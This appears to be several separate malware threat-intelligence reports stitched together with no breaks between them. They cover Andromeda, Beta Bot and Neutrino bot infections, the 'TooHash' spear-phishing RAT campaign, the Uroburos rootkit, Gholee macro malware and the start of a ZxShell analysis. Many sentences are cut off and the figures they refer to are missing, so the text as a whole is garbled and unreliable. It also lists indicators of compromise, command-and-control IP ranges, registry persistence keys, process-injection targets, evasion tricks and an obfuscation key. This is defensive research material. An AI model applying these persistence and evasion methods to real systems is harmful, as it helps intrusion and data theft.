This section presents information about some of the servers we have observed hosting and distributing malware , filename patterns , as well as a triage analysis of various pieces of malware observed delivered by these servers - Servers observed hosting and distributing malware : - Some of the filename patterns observed : - Triage analysis of various pieces of malware observed delivered by servers mentioned in this report : ( Please note that the activity in this section has been recorded per initial file infection and not individually per file downloaded and executed by the initial malware under investigation ) o Andromeda MD5 : 036eb11a5751c77bc65006769921c8e5 This file was observed hosted in the following servers : 1 .
This malware is believed to be a variant from the ' Andromeda Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : a2kiaymoster14902 [ .
This malware is believed to be a variant from the ' Beta Bot ' malware family .
When the file was executed in a Windows XP system , the following activity was observed : Domain : b.9thegamejuststarted14k9 [ .
In a bare - metal system , the malware worked properly .
This malware is believed to be a variant from the ' Neutrino Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : nutqlfkq123a10 [ .
Registry entrenchment : Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : A38973873873 Value Data : C : \ProgramData\bett2f00\hemxccape.exe Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : splwow64.exe Value Data : % APPDATA % \Roaming\WIN - S0MT3UJUS2O\splwow64.exe Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run Value Name : 172157644 Value Data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\WerFault.exe Screenshot showing a handle of the malware in the `` WerFault.exe '' process : Screenshot of related processes running in the victim system : o Andromeda Bot MD5 : 13475d0fdba8dc7a648b57b10e8296d5 This file was observed hosted in the following servers : 1 .
In a bare - metal system , the malware worked properly .
This malware is believed to be a variant from the ' Andromeda Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : a2kiaymoster14902 [ .
The hidden `` WinDefend '' service points to the following DLL : `` C : \Program Files ( x86 ) \Windows Defender\mpsvc.dll '' .
The system was found to have a valid `` mpsvc.dll '' file under the `` C : \Program Files\Windows Defender\ '' directory .
The following screenshot show GMER detecting the hidden service : The following is a summary of all the domains and IPs observed during the analysis of the selected malware : o a2kiaymoster14902 [ .
The following diagram illustrates the relationship between some of the malicious servers , malware hosted / distributed , and vertical markets : The following diagram is based on the analysis / execution of some of the malware hosted and distributed by the malicious servers .
It illustrates the relationship between some of the malicious servers , locations , malware hosted / distributed , and malicious servers to which the malware beacons to with POST requests and to download additional malware : This paper highlights campaigns that has compromised systems at significant enterprises worldwide , utilizing various bot malware .
We are publishing these indicators so others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
General Dynamics Fidelis ' advanced threat defense product , Fidelis XPS™ , detects all of the activity documented in this paper .
Further , we will continue to follow this specific activity and actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
Neutrino Bot ( aka MS : Win32/Kasidet ) , June 2014 : http : //malware.dontneedcoffee.com/2014/06/neutrino - bot - aka - kasidet.html 2 .
Renting a Zombie Farm : Botnets and the Hacker Economy , August 2014 : http : //www.symantec.com / connect / blogs / renting - zombie - farm - botnets - and - hacker - economy 3 .
Big Box LatAm Hack ( 1st part - Betabot ) , January 2014 : http : //securelist.com / blog / research/58213/big - box - latam - hack-1st - part - betabot/ 5 .
A Good Look at the Andromeda Botnet , April 2014 : https : //blog.fortinet.com / post / a - good - look - at - the- andromeda - botnet 6 .
Beta Bot – A Code Review , November 2013 : http : //www.arbornetworks.com / asert/2013/11/beta - bot- a - code - review/ 8 .
Athena , A DDoS Malware Odyssey , Nov 2013 : http : //www.arbornetworks.com / asert/2013/11/athena- a - ddos - malware - odyssey/ 9 .
Andromeda Botnet Gets an Update , July 2013 : http : //blog.trendmicro.com / trendlabs - security- intelligence / andromeda - botnet - gets - an - update/ 10 .
New Commercial Trojan # INTH3WILD : Meet Beta Bot , May 2013 : https : //blogs.rsa.com / new- commercial - trojan - inth3wild - meet - beta - bot/ 11 .
A new bot on the market : Beta Bot , May 2013 : https : //blog.gdatasoftware.com / blog / article / a - new - bot- on-the-market-beta-bot.html 12 .
Andromeda Botnet Resurfaces , March 2013 : http : //blog.trendmicro.com / trendlabs - security- intelligence / andromeda - botnet - resurfaces/ 13 .
Fooled by Andromeda , March 2013 : http : //www.0xebfe.net / blog/2013/03/30/fooled - by - andromeda/ 14 .
Botnets Die Hard - Owned and Operated – Defcon 20 : July 2012 : https : //www.defcon.org / images / defcon-20/dc-20-presentations / Sood - Enbody / DEFCON-20-Sood- Enbody - Botnets - Die - Hard . PDF.pdf 15 .
A Chat With NGR Bot , June 2012 : http : //resources.infosecinstitute.com / ngr - rootkit/ 16 .
The experts of G DATA 's SecurityLabs discovered a cyber - espionage campaign that perfectly exemplifies the way how targeted attacks work .
The purpose of this campaign was to steal valuable documents from the targeted entity .
We entitle this operation `` TooHash '' .
The attackers ' modus operandi is to carry out spear phishing using a malicious Microsoft Office document as an attachment .
The attackers do not choose their targets indiscriminately , which we derive from the fact that they sent specially crafted CV documents , probably to human resources management employees .
Naturally , the recipients are inclined to open such documents on a daily base .
The majority of discovered samples were submitted from Taiwan .
As part of the documents are in Simplified Chinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong , Macao and Taiwan , these malicious documents might have been used against targets in the whole Greater China area .
The attached documents exploit a well - known and rather aged vulnerability ( CVE-2012 - 0158 ) to drop a remote administration tool , or RAT for short , onto the targeted user 's computer .
During the campaign , we identified two different pieces of malware .
Both include common cyber - espionage components such as code execution , file listing , document exfiltration and more .
We discovered more than 75 command and control servers , all used to administrate infected machines .
The servers were mainly located in Hong Kong and the USA .
Furthermore , the administration panel 's language , used by the attackers to manage infected systems , was partly written in Chinese and partly in English .
The exploit used by the attackers is identified and blocked by G DATA 's Exploit Protection technology and G DATA 's security solutions detect the dropped binaries as Win32.Trojan . Cohhoc . A and Win32.Trojan . DirectsX.A respectively .
Nowadays , trade secrets describe one of the major values of almost every company .
Therefore , begrudged competitors may be tempted to steal valuable sensitive information for their purposes .
The leak of sensitive documents can be a disaster for a company and lead to large financial losses .
Furthermore , governmental entities use sensitive , private or classified documents .
Intelligence agencies may be interested to obtain such documents .
The analyzed samples used in the `` TooHash '' campaign were Microsoft Office documents , and were submitted to us from a Taiwanese customer .
An indication leading to the target area is one of the documents used by the attackers , which contained the string '' 102年尾牙、 '' which means `` end of the year 102 '' .
The official calendar used in Taiwan starts in 1912 ( year 1 ) , so the year 102 is the year 2013 according to the Gregorian calendar ( 1911 + 102=2013 ) .
We conclude that the targets are entities located in the Greater China area and on the name of another document used by the attacker called 李辉简历.doc which translates to `` resume of Li Hui '' .
Another lead , suggesting that the attacks occurred in the Greater China area , is the fact that the majority of samples available on VirusTotal were originally submitted from Taiwan .
The DNS - name of the C & C server contained information about affected companies .
Here is a list of some targeted entities :  Public research organization  Space research organization  Telecom companies  Private companies To drop the malware onto the targeted computer and to control the system , the attackers chose to carry out a spear phishing campaign .
This campaign comprised a Microsoft Office document being sent to the victim .
A probable entry point for a manipulated CV would be an HR department .
If the document is opened with an outdated Microsoft Office version , malware is installed by exploiting vulnerability CVE-2012 - 0158 .
To appear credible , the attackers selected the targeted users and the type of the attached documents cleverly .
For example , a Microsoft Office Word document called resume of Li Hui.doc .
The document title as well as the content was written in Simplified Chinese .
The titles of the attacking documents involved are as follows :  文件列表.xls ( file list ) [ Simplified Chinese ]  李辉简历.doc ( resume of Li Hui ) [ Simplified Chinese ]  102年尾牙、103年春酒精緻菜單.xls ( End of the year 102 , year 103 Spring Menu ) [ Traditional Chinese ] To explain the exploit used , we have a look at the Word document , the ostensible CV .
The mentioned exploit causes Microsoft Word to crash , which might alert attacked users just right away .
In our case , the attackers crafted their malicious document in a special way to conceal the software crash : The malicious .doc
Nevertheless , cautious users might suspect malicious actions behind such activities and notify security staff .
The CV that comes with the legitimate Word document ( Wo.doc ) is written in Chinese characters and style used in the Chinese mainland .
Nevertheless , this sample has also been submitted to us from Taiwan .
The resume visible to the user ( Wo.doc ) holds a tracking mechanism : Li Hui 's picture , visible in the document as the blank square on the right hand side , is not stored locally but stored on the Internet .
The following tag , inside the document , reveals this function : As soon as the document is loaded , a network query is performed and notifies the attacker about the successful exploit and the availability of a newly infected machine .
We identified two types of malware used to administrate the infected machines : Cohhoc and DirectsX .
The first one is a `` classic '' Remote Administration Tool .
The second one is more advanced and of a different kind , the malware is a rootkit .
It is executed in kernel mode .
The RAT and the rootkit both share the same command and control infrastructure .
The malware is divided into three parts :  Component 1 : the dropper , used to install the second component into a specific directory and to execute it .
This first file is removed after the execution of the second component ;  Component 2 : a binary , used to unpack the third component and to execute it ;  Component 3 : the payload ; this is the real malicious part , the core of the malware .
The second component is installed into a subfolder of the directory % APPDATA % ( for example in % APPDATA % \Microsoft\ ) .
Known file names for the files used during the campaign discussed : svchost.exe and conime.exe .
The second component works similarly :  It decrypts the payload .
The payload is encrypted with AES .
We identified different keys for different samples .
Once decrypted , the payload is a Windows dynamic library ( .dll
In case you are interested in information regarding the unpacking of this malware , please feel free to contact us using toohash.securityblog @ gdata.de During the TooHash campaign , we were able to identify two variants of `` Cohhoc '' .
Those two versions can be distinguished by looking at the creation of the respective mutex after the malware is started :  H2_COMMON_DLL ( before September 2013 )  NEW_H2_COMMON_DLL ( after September 2013 ) The main difference between the two malware variants is the handling of the payload ( component three ) .
In the earlier version , the payload is located within a resource inside component two .
In the later version , the payload is an additional file .
This additional file is stored in the same directory as the second component and its name is brndlog .
As small as this difference seems to be for a normal computer user , from a malware analyst 's point of view , it is a huge difference .
If , in the first case , the sample was found within a sample database , the analyst would be able to extract the payload and to analyze it right away .
However , in the second case , the analyst can not extract and analyze the payload at all .
In this context , the second component alone is rather useless ; one needs to find the binary which installs the payload .
Furthermore , it is rather complex to create signature detection for an encrypted file , such as the payload discussed .
Persistence is ensured by the creation of a shortcut file ( .lnk
This shortcut is labeled as Internet Explorer .lnk
The blank space just before the file name extension was inserted to trick the user .
The text looks exactly like the original without the additional space .
Furthermore , it is not only the file 's name which sidetracks , but also the icon used for this link comes in the disguise of Microsoft 's Internet Explorer .
The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The `` Cohhoc '' malware is a Remote Administration Tool and is able to :  execute commands or scripts ;  download files ;  upload files ;  collect information about the infected system , for example hostname , username , version of the operating system , installed software ;  find specific documents in order to send them to the command and control servers .
Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .
If the file % APPDATA % \Adobe\ActiveX.dat exists on the system , the malware uses the server listed in this file instead of the hardcoded servers .
The content in the file must use the obfuscation system described in the next chapter .
This approach , using an extra file with server information , proves to be particularly useful for the attackers , as they do not have to transmit new payload to the infected system .
Furthermore , it keeps analysts in the dark about additional C & Cs in case they only see the .dat
This file alone is rather useless .
We have seen the same technique when looking at the differences between the two malware variants before .
The `` Cohhoc '' malware uses an obfuscation layer , to disguise the malware and to complicate the analysis .
The obfuscation is used :  to encode the command and controls ;  to encode the data sent to the command and controls ( information and documents ) ;  to decode the data received from the command and controls ( the commands ) .
This algorithm can easily be adapted in C language .
Fellow researchers are welcome to receive the code after contacting samplerequest @ gdata.de .
To be readable and easily usable , the base64 encoded data ( in binary format ) is converted into ASCII .
Here is an example to decode a command and control : The malware uses HTTP to communicate to the command and control servers .
Here is an example of a request performed by an infected system : The relevant data is placed after the GET request .
Here is the content of the request , decoded by using the code mentioned above : Here are the different parts of the data transmitted :  Green : the current date and time ;  Pink : the hostname of the infected machine ;  Blue : the domain and the username of the infected machine ;  Yellow : the version of the operation system ;  Red : a hardcoded string which means `` end of message '' .
The dropper is used to install two files and the persistence mechanism .
The two files are DirectsX.sys ( the malicious driver ) and directsx ( without any extension ) .
The second file is the encoded payload used by the driver .
The persistence mechanism is realized by the creation of a service .
The installed file and the registry modifications are stored in a resource within the dropper .
Here is a screenshot of the registry key created : The dropper and the driver are both signed by a legitimate certificate .
The certificate is owned by `` Jiangxi you ma chuang da software technology Co. , LTD '' , has been reported stolen and is known to have been used in APT attacks .
Here is a screenshot of the certificate : The main purpose of the driver is to decode the content of the directsx file and to inject the payload into a userland process .
The algorithm used to encode the data in the file is a XOR followed by a SUB : The values of the XOR and the SUB can be different .
The decoding file contains the configuration ( command and control ) and a library ( .dll
Here is an example of configuration : Actually , the library is injected into the process of BitDefender ( seccenter.exe ) , ZoneAlarm ( svchost.exe ) or 360 ( 360tray.exe ) , which means that three popular security products are abused .
If the processes are not running on the infected system , the injection is performed into explorer.exe .
To perform the injection , the driver uses the API KeStackAttachProcess ( ) .
This function allows it to attach the current thread to an address space of a userland process .
The name of the rootkit is linked to its device name : \\device\DirectsX and its symbolic name : \\DosDevices\DirectsX .
The injected dll is signed with the same certificate , too .
It is the remote administration tool itself , injected by the rootkit .
The tool allows the attackers :  to execute code on the infected system ;  to download files ;  to get information about the infected system ;  to steal data such as Office documents or media files .
This library is a variant of a remote administration tool also known as Savit .
We identified more than 75 different servers .
The complete list of domains is available in the appendix .
The IP resolved by the domains changed frequently .
At the time of writing this report , all known C & C servers were mainly located in Hong Kong , with three different host companies :  HONGKONG LONG LIVE NETWORK CO LIMITED  ASIA PACIFIC SERVER COMPANY ( HK )  Simcentric Solution ( HK ) A fourth host company used was located in the US :  Ethrn . Net LLC ( USA ) The IP ranges used by then :  103.228.64.0/24  111.68.3.0/24  112.121.160.0/18  180.178.32.0/18  216.83.32.0/19 The choice of domain names was made to trick the users or the security team during their analysis of the web logs collected .
Have a look at two examples used during the TooHash campaign : * .cnnic - micro.com CNNIC is the acronym for China National Network Information Center .
It is the administrative agency for the Internet domain administration in mainland China .
The domain above is , of course , not owned by CNNIC .
But , unfortunately , the domain is not owned by Adobe either .
Here is an example : nspo.intarnetservices.com .
This could , in the context of the Greater China area , stand for the National Space Organization located in Taiwan .
The attackers control infected machines with the help of web servers installed on the C & Cs , they do not need to have remote access .
Here is the authentication page of the administration panel and aswe can see , the panel is partly written in Simplified Chinese : We did not clearly identify the people behind this campaign .
The use of the stolen certificate could point the Shiqiang group , but nothing can be proven .
Anyway , in our case , the attackers clearly targeted private business and governmental organizations as well .
Either the group decided to target governmental entities as well or the stolen certificate is used by several groups .
In any case , the attackers are well organized and use a huge and complex infrastructure to manage the infected systems .
Furthermore , they use two different malware types in order to always have access to the targeted organizations even if one malware is detected .
The second malware becomes a spare wheel .
We assume that the people behind the group are professionals .
This campaign showed us once more , that people do not hesitate to use sophisticated and deceptive methods to steal data from companies or governmental organizations .
The files submitted to us seem to have targeted companies in the Greater China area but this technology can easily be used against organizations in other countries and regions across the globe .
Due to the increasing value of nowadays ' trade secrets and political secrets , we believe that the use of this kind of sponsored campaign is very likely to increase in the future .
Companies and other entities as well need to increase their security measures and to educate the users about the risks they might encounter while working with a computer – ranging from social engineering to malware attacks , etc .
The exploits used during this campaign are detected by G DATA 's exploit protection system and the files involved are detected by our antivirus engines .
In case you would like to receive further technical information or would like to contribute any information to this case , please feel free to contact us by using the following email address : toohash.securityblog @ gdata.de Documents ( and the original name ) : 8d263d5dae035e3d97047171e1cbf841 ( 102年尾牙、103年春酒精緻菜單.xls ) 7251073c67db6421049ee2baf4f31b62 ( 李辉简历.doc ) 2ec306ef507402037e9c1eeb81276152 ( 文件列表.xls ) 6b83319cf336179f2105999fe586242c ( Wo.doc ) Cohhoc samples : 0c0a3784c3530e820f57da076ea1fc8b b45caf646f94ace23cfa367c5d202944 d4691e06bca3a32c9283d2787b0e40b3 bf4e5e6bef4acc33aea06f770407477e caf3e9500934f89ae4ddf3c6b093af23 f87e765e583e1ead4e0dd56430c469fd 0ad60b49fc47581d19ca2f4e2fc6a6bb 12ee78564ebcb5e203d2991d5ac21ace 1ed0286b4967d9590900faadab8a4926 205e00d44ec0ff5f5c737fa4553e387a 272f23dce6d07f1be9bf2669b99e1530 2e1a5d92343fce92136592f208ca7160 2e4c52e2f424a233f0d5cfa143b4778f 3415e9e50be4de0903d607a2514b23e5 367ad9dd9e263a55d2820b88910b336a 39c5f3f134520bfb70a770de61185d49 3bd5de1f1cd29171709358920d311018 4afda3513ef0f5563f1e77f01dbaed7c 6b5e9eb8eccfd4336ff8910f646dd199 74697ae5fa114222d8d7f8442e57305d a3355ad88ba0802be7e4db0a68394718 a7a40f633e3edc3e36e1dd27c57374b1 b9ea262ac271a72a5310bd0d0561b007 bf4fc457359c6396a360202eee2cc29f e0ee55a01de565ee145ed769ca3deddd f035bce5e0a7e570743c128927a026e1 fd11d2f0f1d388404de4bb8d872ac897 DirectsX samples : 22b955536f27b397f68f22172f8496c2 ecc8245568b5dc1d74d0be6073eafa2d 2857455281e50a80593708e63d68c48f 5ebd4452848879202414a46a09cd2eab ed416eda209e91079a829cc97d57e287 d4e2aadbc0ac414ac5a778da67251c02 % USERPROFILE % \Start Menu\Programs\Startup\Internet Explorer .lnk
G Data Red Paper February 2014 : Uroburos G Data Red Paper February 2014 : Uroburos G Data Security experts have analyzed a very complex and sophisticated piece of malware , designed to steal confidential data .
G Data refers to it as Uroburos , in correspondence with a string found in the malware 's code and following an ancient symbol depicting a serpent or dragon eating its own tail .
Uroburos is a rootkit , composed of two files , a driver and an encrypted virtual file system .
The rootkit is able to take control of an infected machine , execute arbitrary commands and hide system activities .
It can steal information ( most notably : files ) and it is also able to capture network traffic .
Its modular structure allows extending it with new features easily , which makes it not only highly sophisticated but also highly flexible and dangerous .
Uroburos ' driver part is extremely complex and is designed to be very discrete and very difficult to identify .
The development of a framework like Uroburos is a huge investment .
The development team behind this malware obviously comprises highly skilled computer experts , as you can infer from the structure and the advanced design of the rootkit .
We believe that the team behind Uroburos has continued working on even more advanced variants , which are still to be discovered .
Uroburos is designed to work in peer - to - peer mode , meaning that infected machines communicate among each other , commanded by the remote attackers .
By commanding one infected machine that has Internet connection , the malware is able to infect further machines within the network , even the ones without Internet connection .
It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers , by relaying this exfiltrated data through infected machines to one machine with Internet connection .
This malware behavior is typical for propagation in networks of huge companies or public authorities .
The attackers expect that their target does have computers cut off from the Internet and uses this technique as a kind of workaround to achieve their goal .
Uroburos supports 32-bit and 64-bit Microsoft Windows systems .
Due to the complexity of this malware and the supposed spying techniques used by it , we assume that this rootkit targets governments , research institutes , or / and big companies .
Due to many technical details ( file name , encryption keys , behavior and more details mentioned in this report ) , we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent . BTZ .
Uroburos checks for the presence of Agent . BTZ and remains inactive if it is installed .
It appears that the authors of Uroburos speak Russian ( the language appears in a sample ) , which corroborates the relation to Agent . BTZ .
Furthermore , according to public newspaper articles , this fact , the usage of Russian , also applied for the authors of Agent . BTZ .
According to all indications we gathered from the malware analyses and the research , we are sure of the fact that attacks carried out with Uroburos are not targeting John Doe but high profile enterprises , nation states , intelligence agencies and similar targets .
The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed in this environment .
The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .
At the current stage of the investigations it is unknown how Uroburos initially infiltrates high profile networks .
Many infection vectors are conceivable .
The G Data SecurityLabs discovered the rootkit dubbed Uroburos during 2013 .
We decided to investigate in depth soon after we identified the following three interesting aspects :  the usage of virtual file systems  the complexity of the framework  the advanced network capabilities Uroburos is a direct reference to the Greek word Ouroboros ( Οὐροβόρος ) .
The Ouroboros is an ancient symbol depicting a serpent or dragon eating its own tail .
The name of this rootkit is inspired by a plain text string available in several driver files : Ur0bUr ( ) sGotyOu # Furthermore , we identified other references to the ancient serpent / dragon symbol within the rootkit 's code , for example the following strings : Another interesting notion : The exact spelling , Uroburos , can even be found in a webcomic called Homestuck .
In this interactive webcomic , the reader / player needs two codes to receive virtual magic objects ( called juju ) .
Those two codes are in fact uROBuROS and UrobUros .
We can notice that the uppercase and lowercase character order matches the string found within the malware code .
The rootkit is basically composed of two files :  a driver ( .sys
We identified several file names for the driver , for example : Ultra3.sys , msw32.sys , vstor32.sys .
We have encountered 32-bit and 64-bit driver versions .
The two binaries may be installed simultaneously on one system .
The file containing the virtual file system has a random name , followed by the extension .dat
Furthermore , this file is located in the same directory as the driver file .
The installation directory does change , but we were able to identify the following pattern :  % SYSTEMROOT % \ $ Ntuninstall [ Random_ID ] $ The malware 's persistence is established by the creation of a service which automatically executes during each startup of the system .
The service is located in  HKLM\System\CurrentControlSet\Services\Ultra3 The driver is needed to  decrypt the virtual file systems  create several hooks to hide its activities  inject libraries in the users land  establish and manage some communication channels A rootkit naturally tries to hide its activities from the user and so does Uroburos .
The driver uses inline patching to perform the hooks , which is a common way to perform this task .
Inline patching is carried out by modifying the beginning of a targeted system 's function in order to redirect the execution flow to a custom code before jumping back to the original function .
In the current case , the inline patching adds a new interrupt instruction ( int 0xc3 ) at the beginning of the hooked function .
Doing this , the malware adds malicious behavior to legitimate functions .
The main hooked functions are :  ZwQueryKey ( ) , ZwEnumerateKey ( ) , ZwCreateKey ( ) and ZwSaveKey ( ) their purpose is to hide the persistence keys in the registry  ZwReadFile ( ) its purpose is to hide the driver and file system files  ZwQuerySystemInformation ( ) its purpose is to hide rootkit handles  ZwTerminateProcess ( ) its purpose is to terminate cleanly the rootkit during the shutdown of the operating system  ObOpenObjectByName ( ) its purpose is to hide the rootkit 's virtual file systems The Uroburos rootkit uses two virtual file systems – one NTFS file system and one FAT file system .
They are stored locally , on the infected machine .
This means that the victim 's computer contains an encrypted file , which , in reality , hosts another file system .
The virtual file systems are used as a work space by the attackers .
They can store third party tools , post - exploitation tools , temporary files and binary output .
The virtual file systems can be accessed through the devices \Device\RawDisk1 and \Device\RawDisk2 and the volume \\.\Hd1 and \\.\Hd2 .
The encryption used for the file systems is CAST-128 1 .
The respective encryption key is hardcoded within the driver file .
Once decrypted , the virtual file system is a classic NTFS volume , which can be simply accessed through the standard Microsoft file system APIs .
During our analysis , we identified several files the file systems contained :  .bat
Each message in the queue contains a unique ID , a type , a timestamp and content .
The content is also encrypted using the CAST-128 algorithm and the respective key is stored in a message , too .
The messages can contain the following information :  a key to decrypt other messages  a configuration  a file ( or library injected in user land )  … We found classic post - exploitation tools , used by a lot of different APT actors .
The following list provides an overview of the tools found in the virtual file system :  Dumper for NTLM ( hash of a user 's password ) .
This information can be used to perform `` pass the hash '' 2 attacks , to compromise new systems within the infrastructure  information gathering tools , to get information on the infected system  RAR tools , to create archives of stolen documents  Microsoft Office document stealer  … The driver injects several libraries into user land .
These libraries are stored in encrypted form in the queue file .
These files are used to create a kind of `` proxy '' between the kernel land and the user land .
The driver injects two noteworthy libraries : If the infected system is a 64-bit system , Win32 is replaced by Win64 .
The libraries are very huge ( more than 150 functions ) and contain a lot of features .
They are able to manipulate the queue file from the user land .
Following , a list of functions dedicated to the queue management ( qm ) : The libraries have the capability to create and manage a pcap 3 capture .
The purpose of this feature is to generate a snapshot of the network traffic .
The libraries are furthermore used to exfiltrate data to the outside world , namely the attackers .
We identified several protocols to perform this task : generally , the configuration needed for each protocol is stored in the queue file and not within the library itself .
The rootkit supports GET and POST requests and proxy authentication , too .
The default URI is http : // % s / default.asp but it is configurable .
The media type of the request is chosen from the following list :  ICMP protocol the attackers can choose to use ICMP ( ping ) to exfiltrate data  SMTP protocol the attackers can send exfiltrated data by email  Named pipe the attackers can use Microsoft 's named pipe to communicate to another infected machine .
This case will be described in the next chapter The design chosen by the developers is truly efficient : to add a new protocol and a new capability , the attackers do not need to recompile ( or reinstall ) the entire rootkit .
They simply need to adjust the library and replace the library in the queue file with the adjusted one .
The library usage results in modularity well thought out .
Thanks to the protocol described previously , the attacker can even target victims not directly connected to the Internet .
The following figure shows an example of a network scheme we discovered in 2013 : The targeted machine ( A ) is a machine with access to sensitive data , e.g .
The rootkit installed on the system opens a Microsoft named pipe and waits for an incoming connection .
This machine can be named `` spied - on node '' .
The second machine ( B ) is an office machine with the capability to connect to the Internet .
The rootkit is configured to connect to system ( A ) , with the help of the named pipe , and administrate the machine remotely .
Finally , machine ( B ) is able to pass on all data received from machine ( A ) to the Internet .
This machine ( B ) could be named `` proxy node '' .
This peer - to - peer design is really efficient , scalable and resilient .
In case a `` proxy node '' is not available / detected , the attackers can use another infected one .
The advantage for the attackers : even if a security specialist finds one `` spied - on node '' , he can not easily find the `` proxy node '' , due to the fact that this node is a passive node .
Furthermore , the analyst does not automatically have the command and control URL .
In case of incident response , this design is complicated to apprehend and it is hard to contain the infection .
Due to the complexity of the Uroburos rootkit , we estimate that it was designed to target government institutions , research institutions or companies dealing with sensitive information as well as similar high - profile targets .
Concerning the attribution , we found some technical information which allows us to link the Uroburos rootkit to a cyber - attack against the United States of America , carried out in 2008 4 and , particularly , to the worm used by the attackers , called Agent . BTZ .
During this 2008 campaign , a USB stick was deliberately `` lost '' in the parking lot of the United States Department of Defense .
This USB stick contained malicious code and infected the military 's network .
The following leads make us link what we discovered during our analysis with the cyber - attack carried out in 2008 :  the usage of the same obfuscation key in Uroburos and Agent . BTZ ( 1dM3uu4j7Fw4sjnbcwlDqet4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f 5cvd0fk6c1a0s )  the usage of the same file name to store logs : winview.ocx  Uroburos actually checks whether Agent . BTZ is already present on the attacked system , before its installation .
In case Agent . BTZ is installed , Uroburos will not be installed on the system .
The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .
The investment to develop a complete framework such as Uroburos is extremely high .
The developer team behind the development and the design of such an enhanced framework is really skilled .
We believe that , until today , the team behind Uroburos has developed an even more sophisticated framework , which still remains undiscovered .
The design is highly professional ; the fact the attackers use a driver and a virtual file system in two separate files which can only work in combination , makes the analysis really complicated .
One needs to have the two components to correctly analyze the framework .
The driver contains all of the necessary functionality and the file system alone simply can not be decrypted .
The network design is extraordinarily efficient , too ; for an incident response team , it is always complicated to deal with peer - to - peer infrastructure .
It is also hard to handle passive nodes , because one can not quickly identify the link between the different infected machines .
This kind of data stealing software is too expensive to be used as common spyware .
We assume that the attackers reserve the Uroburos framework for dedicated and critical targets .
This is the main reason why the rootkit was only detected many years after the suspected first infection .
Furthermore , we assume that the framework is designed to perform cyber espionage within governments and high profile enterprises but , due to its modularity , it can be easily extended to gain new features and perform further attacks as long as it remains undetected within its target .
There are some strong indications which suggest that the group behind Uroburos is the same as the one behind Agent . BTZ , which allegedly was part of an intelligence agency cyberattack targeting US military bases in 2008 . Notable hints include the usage of the exact same encryption key then and now , as well as the presence of Russian language in both cases .
During the 2014 Israel – Gaza con�ict , dubbed by Israel as `` operation protective edge '' , a raise in cyber - attacks against Israeli targets was reported .
In this report we analyze one case of an operation protective edge themed spear phishing attack .
That email contained a malicious excel �le , which once opened and its VBA code executed , would infect the victim 's computer .
As for the publication of this report , the �le is recognized as malicious by only one antivirus engine .
Based on our analysis , we believe the threat actor behind this malware is a high level professional .
Our investigation of the Gholee malware started following a detection of a suspicious �le that was sent in an email to an undisclosed recipient .
The �le name was ' Operation Protective Edge.xlsb ' ( MD5 : d0c3f4c9896d41a7c42737134ffb4c2e ) .
The �le was uploaded to Virus Total the �rst time on 10 August 2014 , from Israel .
At that time it was not detected as malicious by any of the 52 tested antivirus engines .
Nine days later , it was uploaded again to Virus total , again from Israel .
This time it was detected as malicious only by Kaspersky , as Trojan- Dropper . MSExcel . Agent.ce .
Upon opening the �le a message is displayed , saying : `` Due to security considerations I consciously hid the Informations .
It will be visible for you by enabling content above .
If enabled , the message disappears , and the following information is presented to the victim ( it is possible that the unreadable characters in the screenshot below are the result of an encoding error in our lab environment , and that the victim would see different , readable content ) .
Analysis of the Macro code reveals the following structure : In order to avoid detection by protection measures such as computer antivirus and intrusion detection systems , ASCII characters codes are used instead of actual characters .
The ASCII codes are converted to strings as they are concatenated into a single variable within a function Tens of these functions then concatenated , creating a single PE �le [ 2 ] [ 3 ] Finally , the �le is saved to NTUSER.data .
The Dll �le is obfuscated and includes various mechanism to hide from Debuggers such as Ollydbg and IDA and from Sandbox software such as Cuckoo and Anubis .
Analyzing the �le , we have found an interesting entry point called gholee .
The certi�cate was issued for security company Core Security , the creators of the offensive suite Core Impact , for the address * coreimpactagent.net .
The �le name is `` svchost 67.exe '' ( MD5 : 916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to Virus Total [ 5 ] on 2 June 2014 , more than two months earlier than `` Operation Protective Edge.xlsb '' .
It was uploaded twice from Latvia – potentially to test the malware 's detection rate .
By using GPO to disable macro code from running , infection by this malware may be avoided .
Alternatively , �les containing macro code should be blocked at the email gateway or by an anti - spam solution .
Logs and proxy servers should be checked for communication with the IP addresses with which the malware communicates : 83.170.33.60 83.170.33.37 If you think you got infected , check in the system root folder for a �le called NTUSER.DAT .
This post was authored by Andrea Allievi , Douglas Goddard , Shaun Hurley , and Alain Zidouemba .
Recently , there was a blog post on the takedown of a botnet used by threat actor group known as Group 72 and their involvement in Operation SMN .
This group is sophisticated , well funded , and exclusively targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , and media sector .
The primary attack vectors are watering - hole , spear phishing , and other web - based attacks .
Frequently , a remote administration tool ( RAT ) is used to maintain persistence within a victim 's organization .
These tools are used to further compromise the organization by attacking other hosts inside the targets network .
Once the RAT is installed on the host it will be used to administer the client , exfiltrate data , or leverage the client as a pivot to attack an organization 's internal infrastructure .
Here is a short list of the types of tools included with ZxShell : Keylogger ( used to capture passwords and other interesting data ) Command line shell for remote administration Remote desktop Various network attack tools used to fingerprint and compromise other hosts on the network Local user account creation tools For a complete list of tools please see the MainConnectionIo section .
The following paper is a technical analysis on the functionality of ZxShell .
The analysts involved were able to identify command and control ( C2 ) servers , dropper and installation methods , means of persistence , and identify the attack tools that are core to the RAT 's purpose .
In addition , the researchers used their analysis to provide detection coverage for Snort , Fireamp , and ClamAV .
There are a lot of versions available in the underground market .
